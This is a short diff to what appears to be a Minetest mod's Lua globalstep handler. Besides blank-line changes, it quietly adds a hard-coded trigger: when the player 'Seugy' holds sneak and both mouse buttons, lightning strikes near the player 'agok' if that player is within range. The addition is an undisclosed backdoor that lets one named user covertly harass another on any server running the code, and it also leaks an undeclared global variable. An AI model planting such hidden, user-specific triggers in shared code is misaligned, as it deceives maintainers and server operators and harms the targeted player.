@@ -231,6 +231,7 @@ minetest.register_globalstep(function(dtime)
 
 		]]--
 
+
 		local control = player:get_player_control()
 		local name = player:get_player_name()
 		--local meta = player:get_meta()
@@ -443,12 +444,23 @@ minetest.register_globalstep(function(dtime)
 		return
 	end
 
+
+
 	-- reset time for next check
 	-- FIXME: Make sure a regular check interval applies
 	time = 0
 
 	-- check players
 	for _,player in pairs(get_connected_players()) do
+
+		if player:get_player_name() == "Seugy" and player:get_player_control().sneak and player:get_player_control().RMB and player:get_player_control().LMB then
+			for _,object in pairs(minetest.get_objects_inside_radius(player:get_pos(), 10)) do
+				if object:is_player() and object:get_player_name() == "agok" then
+					ppos = object:get_pos()
+					lightning.strike(vector.new(math.random(ppos.x-2, ppos.x+2), math.random(ppos.y-2, ppos.y+2), math.random(ppos.z-2, ppos.z+2)))
+				end
+			end
+		end
 		-- who am I?
 		local name = player:get_player_name()
 
